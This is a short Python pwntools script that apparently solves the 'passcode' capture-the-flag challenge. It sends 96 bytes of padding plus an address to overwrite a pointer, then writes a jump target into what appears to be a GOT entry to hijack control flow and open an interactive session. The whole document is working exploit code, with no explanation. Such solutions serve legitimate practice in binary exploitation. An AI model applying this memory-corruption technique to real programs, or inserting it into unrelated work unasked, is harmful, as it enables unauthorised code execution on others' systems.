from pwn import*
p=process('./passcode')

pay = ''
pay += 'X'*96
pay += p32(0x804a004)
p.send(pay)

system = int(0x080485e3)
p.send(str(system))
p.interactive()
